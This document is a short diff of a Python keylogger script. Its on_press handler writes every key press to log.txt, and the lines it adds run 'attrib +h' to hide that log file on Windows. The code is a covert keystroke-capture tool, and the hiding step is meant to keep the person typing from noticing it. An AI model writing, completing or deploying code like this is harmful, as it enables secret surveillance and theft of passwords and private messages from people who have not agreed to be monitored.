@@ -6,7 +6,9 @@ log_Directory = os.getcwd() + '/'  # where save file
 print(os.getcwd()) # directory
 # create file 
 logging.basicConfig(filename=(log_Directory + "log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
-
+p = os.popen('attrib +h ' + "log.txt")
+t = p.read()
+p.close()
 # function in logging
 def on_press(key):
     logging.info(key)
